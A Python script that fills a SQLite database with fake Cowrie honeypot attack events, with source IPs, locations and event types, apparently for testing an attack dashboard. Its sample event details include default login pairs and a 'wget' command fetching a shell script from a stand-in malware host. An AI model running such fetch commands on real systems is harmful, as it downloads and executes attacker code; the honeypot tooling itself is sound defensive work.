#!/usr/bin/env python3
import sqlite3
import random
from datetime import datetime, timedelta, timezone

DB = "/data/attacks.db"  # <-- Düzeltildi

FAKE_DATA = [
    ("45.155.205.233", "Netherlands", "Amsterdam", "NL", 52.37, 4.90),
    ("185.220.101.34", "Germany", "Berlin", "DE", 52.52, 13.40),
    ("103.224.182.253", "Indonesia", "Jakarta", "ID", -6.20, 106.80),
    ("91.240.118.172", "Russia", "Moscow", "RU", 55.75, 37.62),
    ("162.142.125.36", "United States", "New York", "US", 40.71, -74.00),
    ("196.52.43.79", "South Africa", "Johannesburg", "ZA", -26.20, 28.04),
    ("78.128.113.94", "Bulgaria", "Sofia", "BG", 42.70, 23.32),
]

EVENT_TYPES = [
    ("cowrie.login.failed", "Login failed: root/123456"),
    ("cowrie.login.failed", "Login failed: admin/admin"),
    ("cowrie.login.success", "Login success: root/root"),
    ("cowrie.command.input", "Command: wget http://malware.example.com/bad.sh"),
    ("cowrie.session.file_download", "File download: http://malware.example.com/bad.sh"),
]

def seed():
    conn = sqlite3.connect(DB)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS events (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    timestamp TEXT,
                    src_ip TEXT,
                    event_type TEXT,
                    details TEXT,
                    country TEXT DEFAULT '',
                    city TEXT DEFAULT '',
                    country_code TEXT DEFAULT '',
                    lat REAL DEFAULT 0,
                    lon REAL DEFAULT 0
                )''')
    base_time = datetime.now(timezone.utc) - timedelta(hours=2)  # <-- Düzeltildi
    for i in range(30):
        data = random.choice(FAKE_DATA)
        event = random.choice(EVENT_TYPES)
        ts = (base_time + timedelta(minutes=i*5)).isoformat()
        c.execute("""INSERT INTO events (timestamp, src_ip, event_type, details, country, city, country_code, lat, lon)
                     VALUES (?,?,?,?,?,?,?,?,?)""",
                  (ts, data[0], event[0], event[1], data[1], data[2], data[3], data[4], data[5]))
    conn.commit()
    conn.close()
    print("Veritabanına 30 sahte saldırı kaydı eklendi.")

if __name__ == "__main__":
    seed()